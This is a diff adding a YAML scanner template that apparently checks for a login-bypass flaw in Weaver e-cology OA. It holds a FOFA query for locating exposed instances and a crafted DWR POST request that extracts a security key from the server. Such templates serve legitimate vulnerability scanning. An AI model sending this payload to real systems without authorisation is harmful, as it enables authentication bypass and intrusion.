@@ -1,0 +1,17 @@
+id: poc-yaml-weaver-e-cology-login-bypass
+info:
+  name: 泛微OA e-cology 登录绕过漏洞
+  severity: high
+  tags:
+  - 两高一弱
+  - 认证绕过
+  finger: e-cology
+  fofa: app="泛微-协同办公OA"
+requests:
+- method: POST
+  path: /dwr/call/plaincall/?callCount=1&c0-id=1&c0-scriptName=WorkflowSubwfSetUtil&c0-methodName=LoadTemplateProp&batchId=a&c0-param0=string:mobilemode&scriptSessionId=1&a=.swf
+  expression: status_code == 200 && matches(body,`security.key':"([0-9a-zA-Z-]+)"`)
+    && contains(body,"dwr.engine._remoteHandleCallback") && contains(content_type,"text/javascript")
+    && contains(headers,"ecology_JSessionid")
+variables: {}
+transport: http
